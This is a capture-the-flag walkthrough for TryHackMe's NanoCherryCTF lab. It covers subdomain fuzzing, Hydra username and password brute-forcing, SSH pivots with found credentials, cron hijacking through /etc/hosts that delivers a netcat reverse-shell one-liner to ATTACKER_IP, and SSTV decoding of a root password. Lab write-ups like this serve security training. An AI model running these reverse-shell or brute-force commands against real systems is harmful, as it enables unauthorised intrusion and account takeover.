# [NanoCherryCTF](https://tryhackme.com/room/nanocherryctf)

## Explore a double-sided site and escalate to root!

# Story, Deployment, and Setup

## The Story:

The vigilante hacker and Vim enthusiast has enlisted you for help! He's been tipped off that the enigmatic ice cream shop owner Chad Cherry and his creamy crew are up to something nefarious: they plan to use their totally legit business to rid the world of the greatest text editor, Vim, and replace it with their preferred editor Nano! You'll need to hack into the ice cream shop and escalate your privileges to take them down! Jex has already gained initial access and has created a backdoor account to help you out.

## The Backdoor:

Jex has set up a backdoor account for you to use to get started.

**Username:** notsus

**Password:** dontbeascriptkiddie

# NanoCherryCTF

## Compromise the server and escalate your privileges to root! Not all flags/password segments need to be found in order.

### Gain access to Molly's Dashboard. What is the flag?

1. Add the target IP to `/etc/hosts` to enable domain name resolution for `cherryontop.thm`.

```bash
echo "<TARGET_IP> cherryontop.thm" >> /etc/hosts
```

2. Perform a TCP port scan with service and version detection to identify all open services on the target.

```bash
nmap -p- -sVC cherryontop.thm
```

**Results:**

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 d6:e7:1a:ba:e7:77:16:ea:e7:9f:f1:bc:4a:02:8f:69 (ECDSA)
|_  256 2e:da:af:66:f0:72:f1:aa:e1:17:72:65:94:8a:e5:17 (ED25519)
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Cherry on Top Ice Cream Shop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

3. The site description mentions a "double-sided site", suggesting virtual hosting. Fuzz the Host header to discover hidden subdomains. The `-fw 5633` flag filters out the default page by its word count, revealing only meaningful responses.`

```bash
ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u http://cherryontop.thm -H "Host: FUZZ.cherryontop.thm" -fw 5633
```

**Results:**

```
nano                    [Status: 200, Size: 10718, Words: 4093, Lines: 220, Duration: 48ms]
```

4. Add discovered subdomain `nano.cherryontop.thm` to `etc/hosts` so it resolves correctly alongside the main domain.

5. Perform directory and file enumeration on the `nano.cherryontop.thm` subdomain to map out its attack surface, including PHP files.

```bash
gobuster dir -u http://nano.cherryontop.thm -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php -t 50
```

**Results:**

```
images               (Status: 301) [Size: 329] [--> http://nano.cherryontop.thm/images/]
index.php            (Status: 200) [Size: 10718]
login.php            (Status: 200) [Size: 2310]
css                  (Status: 301) [Size: 326] [--> http://nano.cherryontop.thm/css/]
js                   (Status: 301) [Size: 325] [--> http://nano.cherryontop.thm/js/]
logout.php           (Status: 302) [Size: 0] [--> login.php]
command.php          (Status: 302) [Size: 0] [--> login.php]
bootstrap            (Status: 301) [Size: 332] [--> http://nano.cherryontop.thm/bootstrap/]
jquery               (Status: 301) [Size: 329] [--> http://nano.cherryontop.thm/jquery/]
server-status        (Status: 403) [Size: 285]
```

6. Exploit the username enumeration to find valid accounts. Using a single dummy password against a large username wordlist, Hydra identifies any username that produces a different error.

```bash
hydra -L /usr/share/wordlists/SecLists/Usernames/xato-net-10-million-usernames.txt -p password nano.cherryontop.thm http-post-form "/login.php:username=^USER^&password=^PASS^&submit=:F=This user doesn't exist"
```

**Results:**

```
[80][http-post-form] host: nano.cherryontop.thm   login: puppet   password: test
```

7. With a valid username confirmed, brute-force its password using the rockyou wordlist. The failure condition is now the `Bad password` message.

```bash
hydra -l puppet -P /usr/share/wordlists/rockyou.txt nano.cherryontop.thm http-post-form "/login.php:username=^USER^&password=^PASS^&submit=:Bad password"
```

**Results:**

```
[80][http-post-form] host: nano.cherryontop.thm   login: puppet   password: master
```

8. Log in at `http://nano.cherryontop.thm/login.php` with credentials `puppet:master` and navigate to `http://nano.cherryontop.thm/command.php` to access Molly's admin dashboard. The flag is displayed on top of this page.

<img width="1375" height="381" alt="SCREEN02" src="https://github.com/user-attachments/assets/9134c0a5-d2cb-43d2-934d-b733121ce19f" />

---

### What is the first part of Chad Cherry's password?

1. At the bottom of the `http://nano.cherryontop.thm/command.php` dashboard, SSH credentials for the `molly-milk` account are visible in plain text.

2. Connect to the server via SSH as molly-milk using the credentials found on the dashboard.

```bash
ssh molly-milk@cherryontop.thm
# Password: ChadCherrysFutureWife
```

3. List the files in Molly's home directory and read the key file to retrieve the first segment of Chad Cherry's password.

```bash
cat chads-key1.txt
```

<img width="957" height="353" alt="SCREEN03" src="https://github.com/user-attachments/assets/4421d972-e5d6-4f47-98f2-0227121380a5" />

4. Read the other note in the home directory for additional story context. The postscript confirms Molly is holding on to the first password segment.

```bash
cat DONTLOOKCHAD.txt
```

**Results:**

```
Dear Chad,

Cherries, Ice Cream, and Milk,
In the bowl of life, we mix and swirl,
Like cherries, ice cream, and milk's swirl.
Cherries so red, plucked from the tree,
Sweet as your love, pure as can be.
Ice cream so smooth, so cool and white,
Melts in my mouth, with sheer delight.
Milk so pure, so creamy and rich,
The base of our love, the perfect mix.
Together they blend, in perfect harmony,
Like you and I, so sweet, so free.
With each bite, my heart takes flight,
As our love grows, so strong, so bright.
Cherries, ice cream, and milk,
Our love's ingredients, so smooth and silk.
Forever and always, our love will stay,
Like the sweet taste, that never fades away.

Love,
Molly

P.S. I'll hold on tight to that first part of your password you gave me! If anything ever happens to you, we'll all be sure to keep your dream of erasing vim off of all systems alive!
```

---

### What is the second part of Chad Cherry's password?

1. Enumerate directories and PHP files on the main `cherryontop.thm` site to discover any additional functionality not visible from the homepage.

```bash
gobuster dir -u http://cherryontop.thm -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php -t 50
```

2. Browsing to `http://cherryontop.thm/content.php?facts=1&user=I52WK43U` reveals a page that serves personalized ice cream facts. The `facts` parameter is a numeric ID and the `user` parameter is a Base32-encoded username. Fact 1 with different user values returns different content, indicating user-specific hidden facts that could contain credentials.

3. Generate a sequential numeric wordlist to use as the `facts` fuzzing payload, then Base32-encode the target username `sam-sprinkles` to construct the correct user parameter.

```bash
seq 10000 > facts
echo -n "sam-sprinkles" | base32
```

4. Fuzz the `facts` ID parameter for the `sam-sprinkles` user. The -`fr "Error"` flag filters out responses that contain the word "Error", keeping only valid fact pages.

```bash
ffuf -u "http://cherryontop.thm/content.php?facts=FUZZ&user=ONQW2LLTOBZGS3TLNRSXG===" -w facts -mc all -fr "Error"
```

**Results:**

```
4                       [Status: 200, Size: 2523, Words: 761, Lines: 63, Duration: 46ms]
3                       [Status: 200, Size: 2514, Words: 762, Lines: 63, Duration: 49ms]
2                       [Status: 200, Size: 2519, Words: 762, Lines: 63, Duration: 50ms]
43                      [Status: 200, Size: 2558, Words: 764, Lines: 63, Duration: 43ms]
50                      [Status: 200, Size: 2487, Words: 757, Lines: 63, Duration: 45ms]
64                      [Status: 200, Size: 2486, Words: 757, Lines: 63, Duration: 44ms]
1                       [Status: 200, Size: 2499, Words: 759, Lines: 63, Duration: 2914ms]
20                      [Status: 200, Size: 2479, Words: 755, Lines: 63, Duration: 3922ms]
```

5. Fact ID 43 has a noticeably larger response size compared to the others. Navigating to `http://cherryontop.thm/content.php?facts=43&user=ONQW2LLTOBZGS3TLNRSXG===` reveals SSH credentials.

6. Connect to the server via SSH as `sam-sprinkles` using the discovered credentials.

```bash
ssh sam-sprinkles@cherryontop.thm
# Password: SammyInMiami43
```

7. Read the key file in Sam's home directory to retrieve the second segment of Chad Cherry's password.

```bash
cat chads-key2.txt
```

<img width="957" height="376" alt="SCREEN04" src="https://github.com/user-attachments/assets/1993e3ab-cf10-462b-a0a5-44ba874862b1" />

8. Read the note Sam left behind for additional story context. It confirms Sam is also safeguarding a password segment.

```bash
cat 'whyChadWhy??.txt'
```

**Results**

```
Dude Chad! I thought we were bros!

I don't know if you'll ever read this, but ever since Molly joined the company, you've changed!

We had such a bromance going on and now you're letting her dig her nails into you!

I know you said you're not that into her, but I see how you tool look at eachother! It was always get paid before milk maids!

But I guess you've fallen for a milk maid now! I'm worried about you man...

Either way, I'll keep your secret password segment nice and hidden.

I hope we can hangout again soon.

Your friend,

Sam
```

---

### What is the third part of Chad Cherry's password?

1. Log in via the backdoor account created by Jex to establish a new foothold on the system.

```bash
ssh notsus@cherryontop.thm
# Password: dontbeascriptkiddie
```

2. Read the note left by Jex, which confirms the next step is a lateral movement to the `bob-boba` account.

```bash
cat youFoundIt.txt
```

**Results:**

```
Hey good work hacker. Glad you made it this far!

From here, we should be able to hit Bob-Boba where it hurts! Could you find a way to escalate your privileges vertically to access his account?

Keep your's eyes peeled and don't be a script kiddie!

- Jex
```

3. Inspect the system-wide crontab for scheduled tasks running as other users. A cron job executes every minute as `bob-boba`, fetching and executing a shell script from `cherryontop.tld:8000` via `curl | bash`.

```bash
cat /etc/crontab
```

**Results:**

```
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
# You can also override PATH, but by default, newer versions inherit it from the environment
#PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
*  *    * * *   bob-boba curl cherryontop.tld:8000/home/bob-boba/coinflip.sh | bash
```

4. **On the target machine**, redirect `cherryontop.tld` to the attacker's IP so the cron job fetches the script from our controlled server instead.

```bash
echo "<ATTACKER_IP> cherryontop.tld" >> /etc/hosts
```

5. **On the attacker machine**, create the directory structure that mirrors the expected path `/home/bob-boba/coinflip.sh` and write a reverse shell payload into it.

```bash
mkdir home
cd home
mkdir bob-boba
cd bob-boba
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/bash -i 2>&1 | nc <ATTACKER_IP> 4444 > /tmp/f" > coinflip.sh
```

6. **On the attacker machine**, from the root of the created directory structure, start a Python HTTP server to serve the malicious script on port 8000.

```bash
cd ../../
python -m http.server 8000
```

7. **On the attacker machine**, set up a netcat listener to catch the reverse shell connection spawned by the cron job.

```bash
nc -lvnp 4444
```

8. Wait up to one minute for the cron job to fire. Once the shell connects back as `bob-boba`, read the third key file to retrieve the final password segment.

```bash
cat chads-key3.txt
```

<img width="398" height="154" alt="SCREEN01" src="https://github.com/user-attachments/assets/8c3b1fab-33ae-47c2-8078-05cd46a6cc34" />

9. Read Bob's log for context on his role in the story.

```bash
cat bobLog.txt
```

**Results:**

```
Bob Log

4/10/20XX

One of the funniest parts of working for Chad is both how much debt we have and how much other people owe us!

I know that Chad uses me as both his accountant and debt collector, but really, we need to hire more henchmen.

Perhaps we can convince the Arch Linux users to join our cause... Hopefully none of them like Vim, after all, Chad intends to eliminate every trace of the text editor and replace it with Nano.

Either way, I gotta really protect this password segment Chad gave me in case of emergencies!

Bob
```

---

### Put the three parts of Chad Cherry's password together and access his account. What is the flag you obtained?

1. Concatenate the three password segments from `chads-key1.txt`, `chads-key2.txt`, and `chads-key3.txt` to form Chad Cherry's full password and SSH in as `chad-cherry`.

```bash
ssh chad-cherry@cherryontop.thm
```

2. Read the flag file in Chad's home directory.

```bash
cat chad-flag.txt
```

<img width="955" height="369" alt="SCREEN05" src="https://github.com/user-attachments/assets/332441f3-97a2-4338-bd9d-b12fc6b0950f" />

---

### What is the root flag?

1. Download the `rootPassword.wav` audio file from Chad Cherry's home directory to the attacker machine using SCP.

```bash
scp chad-cherry@cherryontop.thm:rootPassword.wav .
```

2. The WAV file encodes the root password using **SSTV**, a technique originally used by radio operators to transmit still images over audio. Decode the file using an online SSTV decoder such as `https://sstv-decoder.mathieurenaud.fr/` by uploading the WAV. The decoded image reveals the root password.

3. Switch to the root user with the decoded password and read the root flag.

```bash
su
cat root-flag.txt
```

<img width="426" height="175" alt="SCREEN06" src="https://github.com/user-attachments/assets/033c5f21-4dfa-4260-82cb-49265b85b4fb" />
